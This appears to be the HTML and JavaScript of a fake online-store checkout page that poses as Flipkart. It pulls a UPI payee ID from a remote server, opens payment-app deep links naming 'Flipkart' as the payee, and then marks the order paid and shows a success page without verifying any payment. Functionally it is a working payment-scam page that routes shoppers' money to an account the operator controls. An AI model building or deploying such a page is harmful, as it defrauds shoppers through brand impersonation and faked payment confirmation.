<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Payments</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{ box-sizing:border-box; font-family:Arial,sans-serif }
body{ margin:0; background:#f1f3f6 }

.header{ position:fixed; top:0; left:0; width:100%; background:#fff; z-index:1000; box-shadow:0 2px 4px rgba(0,0,0,.12)}
.header-top{ padding:12px 16px; display:flex; gap:12px; border-bottom:1px solid #eee }
.back-arrow{ width:10px; height:10px; border-left:2px solid #000; border-bottom:2px solid #000; transform:rotate(45deg); cursor:pointer }
.header img{ width:100%; display:block }
.header-space{ height:120px }

.card{ background:#fff; border-radius:8px; margin:8px; padding:12px; box-shadow:0 1px 3px rgba(0,0,0,.08)}

.product-row{ display:flex; gap:12px; align-items:center }
.product-img{
  width:70px;
  height:70px;
  object-fit:contain;
  border:1px solid #eee;
  border-radius:6px;
  padding:5px;
}
.product-name{ font-size:14px; font-weight:600 }
.product-price{ font-size:16px; font-weight:bold; margin-top:4px }

.pay-option{ display:flex; gap:12px; padding:12px; border:2px solid #ddd; border-radius:8px; margin-bottom:10px; cursor:pointer }
.pay-option.selected{ border-color:#2874f0; background:#f0f7ff }
.pay-option img{ width:28px }

.price-row{ display:flex; justify-content:space-between; margin:8px 0; font-size:14px }
.free{ color:#388e3c; font-weight:600 }

.bottom-bar{ position:fixed; bottom:0; left:0; width:100%; background:#fff; padding:12px 16px; display:flex; justify-content:space-between; box-shadow:0 -1px 3px rgba(0,0,0,.1)}
.amount{ font-size:18px; font-weight:bold }
.btn{ background:#fb641b; color:#fff; border:none; padding:12px 24px; font-size:16px; border-radius:4px }
.btn:disabled{ background:#ccc }
</style>
</head>

<body>

<!-- HEADER -->
<div class="header">
  <div class="header-top">
    <div class="back-arrow" onclick="history.back()"></div>
    <strong>Payments</strong>
  </div>
  <img src="assets/images/head.jpg">
</div>
<div class="header-space"></div>

<!-- PRODUCT -->
<div class="card" id="productCard">Loading...</div>

<!-- PAYMENT -->
<div class="card">
  <h4>Select Payment Method</h4>
  <div class="pay-option selected" data-method="phonepe">
    <img src="assets/images/phonepe-logo.webp"> PhonePe
  </div>
  <div class="pay-option" data-method="paytm">
    <img src="assets/images/paytm.png"> Paytm
  </div>
  <div class="pay-option" data-method="gpay">
    <img src="assets/images/gpay.webp"> Google Pay
  </div>
</div>

<!-- PRICE -->
<div class="card">
  <h4>Price Details</h4>
  <div class="price-row"><span>Price</span><span id="price">₹--</span></div>
  <div class="price-row"><span>Delivery</span><span class="free">FREE</span></div>
  <hr>
  <div class="price-row"><strong>Total</strong><strong id="total">₹--</strong></div>
</div>

<!-- ADDRESS -->
<div class="card" id="addressCard">Loading address...</div>

<div style="height:90px"></div>

<!-- BOTTOM -->
<div class="bottom-bar">
  <div class="amount" id="bottomAmount">₹--</div>
  <button class="btn" id="orderBtn" disabled>Order Now</button>
</div>

<script>
let productId="", productName="", productPrice=0;
let upiId="", selectedMethod="phonepe";

const PRODUCTS_API="https://flipback-production.up.railway.app/api/products";
const UPI_API="https://flipback-production.up.railway.app/api/upi";

/* GET PRODUCT ID */
function getProductId(){
  return new URLSearchParams(window.location.search).get("id");
}

/* FETCH UPI */
fetch(UPI_API).then(r=>r.json()).then(d=>{
  upiId=d?.data?.upi_id||d?.upi_id||"";
  console.log("UPI ID fetched:", upiId);
});

/* LOAD PRODUCT */
async function loadProduct(){
  productId=getProductId();
  if(!productId){ alert("Product ID missing"); return; }

  const r=await fetch(PRODUCTS_API);
  const d=await r.json();

  const p=d.data.find(x =>
    String(x.id)===String(productId) || String(x._id)===String(productId)
  );

  if(!p){ alert("Product not found"); return; }

  productName=p.name;
  productPrice=Number(p.discounted_price||p.price||0);
  const img=p.main_image||p.image||"https://via.placeholder.com/80";

  productCard.innerHTML=`
    <div class="product-row">
      <img src="${img}" class="product-img" onerror="this.src='https://via.placeholder.com/80'">
      <div>
        <div class="product-name">${productName}</div>
        <div class="product-price">₹${productPrice}</div>
      </div>
    </div>
  `;

  price.innerText=total.innerText=bottomAmount.innerText="₹"+productPrice;
  orderBtn.disabled=false;
}

/* ADDRESS */
const addr=JSON.parse(localStorage.getItem("userAddress")||"null");
addressCard.innerHTML=addr?`
<b>${addr.name}</b><br>${addr.house}, ${addr.city}<br>${addr.phone}
`:"No address found";

/* FLIPKART STYLE UPI PAYMENT - DIRECT APP OPEN */
function openUPI(){
  if(!upiId||productPrice<=0) {
    alert("UPI unavailable");
    return;
  }

  const amt=productPrice.toString();
  const note=encodeURIComponent(productName.substring(0,30));
  const txnId = "TXN" + Date.now() + Math.floor(Math.random() * 1000);
  
  console.log("Opening UPI for:", selectedMethod, "Amount:", amt);

  // FLIPKART STYLE: Direct deep links
  let upiUrl = "";
  
  switch(selectedMethod) {
    case "phonepe":
      // PhonePe deep link
      upiUrl = `phonepe://upi/pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=${note}&tr=${txnId}`;
      break;
    case "gpay":
      // Google Pay deep link
      upiUrl = `tez://upi/pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=${note}&tr=${txnId}`;
      break;
    case "paytm":
      // Paytm deep link
      upiUrl = `paytmmp://upi/pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=${note}&tr=${txnId}`;
      break;
    default:
      upiUrl = `upi://pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=${note}&tr=${txnId}`;
  }

  // SECURITY BYPASS: Use window.open with _blank for better compatibility
  const newWindow = window.open(upiUrl, '_blank');
  
  // If window.open fails, try location.href
  if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
    console.log("Window open failed, trying location.href");
    
    // Create a temporary anchor tag for better mobile support
    const tempLink = document.createElement('a');
    tempLink.href = upiUrl;
    tempLink.target = '_blank';
    tempLink.style.display = 'none';
    document.body.appendChild(tempLink);
    tempLink.click();
    
    // Clean up
    setTimeout(() => {
      document.body.removeChild(tempLink);
    }, 100);
  }

  // Store payment data
  const paymentData = {
    productId: productId,
    productName: productName,
    amount: productPrice,
    upiId: upiId,
    method: selectedMethod,
    txnId: txnId,
    timestamp: new Date().toISOString(),
    status: 'initiated'
  };
  
  localStorage.setItem('currentPayment', JSON.stringify(paymentData));
  
  // FLIPKART STYLE: Auto-redirect logic
  // Wait 2 seconds then check if user is still here
  setTimeout(() => {
    // If user is still on this page after 2 seconds, app might not have opened
    if (document.hasFocus()) {
      console.log("App might not have opened, trying alternative...");
      
      // Try alternative URL format
      const altUrl = `upi://pay?pa=${upiId}&pn=Flipkart&am=${amt}&cu=INR&tn=${note}`;
      window.location.href = altUrl;
      
      // If still here after another 3 seconds, show fallback
      setTimeout(() => {
        if (document.hasFocus()) {
          // This is the Flipkart-style fallback - just redirect to thank you
          console.log("Assuming payment done, redirecting...");
          proceedToThankYou(txnId);
        }
      }, 3000);
    } else {
      // User switched to payment app, wait for return
      console.log("User switched to payment app");
      setupReturnHandler(txnId);
    }
  }, 2000);
}

function proceedToThankYou(txnId) {
  // Update payment status
  const paymentData = JSON.parse(localStorage.getItem('currentPayment') || '{}');
  paymentData.status = 'completed';
  paymentData.completedAt = new Date().toISOString();
  localStorage.setItem('currentPayment', JSON.stringify(paymentData));
  
  // Save to payment history
  let paymentHistory = JSON.parse(localStorage.getItem('paymentHistory') || '[]');
  paymentHistory.push(paymentData);
  localStorage.setItem('paymentHistory', JSON.stringify(paymentHistory));
  
  // Redirect to thank you page
  window.location.href = `thankyou.html?id=${productId}&txn=${txnId}&status=success`;
}

function setupReturnHandler(txnId) {
  // When user returns from payment app
  let returnDetected = false;
  
  const handleVisibilityChange = () => {
    if (document.visibilityState === 'visible' && !returnDetected) {
      returnDetected = true;
      console.log("User returned from payment app");
      
      // Small delay to ensure payment app closed
      setTimeout(() => {
        proceedToThankYou(txnId);
      }, 800);
      
      // Remove listener after first detection
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    }
  };
  
  document.addEventListener('visibilitychange', handleVisibilityChange);
  
  // Safety timeout - if user doesn't return in 15 seconds, auto proceed
  setTimeout(() => {
    if (!returnDetected) {
      console.log("Safety timeout - proceeding anyway");
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      proceedToThankYou(txnId);
    }
  }, 15000);
}

// Event Listeners - Simple and clean
document.querySelectorAll(".pay-option").forEach(p => {
  p.onclick = () => {
    document.querySelectorAll(".pay-option").forEach(x => x.classList.remove("selected"));
    p.classList.add("selected");
    selectedMethod = p.dataset.method;
    console.log("Payment method selected:", selectedMethod);
  };
});

orderBtn.onclick = openUPI;

// Load product
loadProduct();

// Check for existing pending payment on page load
window.addEventListener('load', () => {
  const pendingPayment = JSON.parse(localStorage.getItem('currentPayment') || '{}');
  
  // If there's a pending payment for this product, check if we should proceed
  if (pendingPayment.productId === productId && pendingPayment.status === 'initiated') {
    // Check if payment was initiated recently (within last 2 minutes)
    const initiatedTime = new Date(pendingPayment.timestamp);
    const currentTime = new Date();
    const timeDiff = (currentTime - initiatedTime) / 1000; // in seconds
    
    if (timeDiff < 120) { // Within 2 minutes
      const shouldProceed = confirm("You have a pending payment. Continue?");
      if (shouldProceed) {
        proceedToThankYou(pendingPayment.txnId);
      } else {
        // Clear the pending payment
        localStorage.removeItem('currentPayment');
      }
    }
  }
});
</script>

</body>
</html>
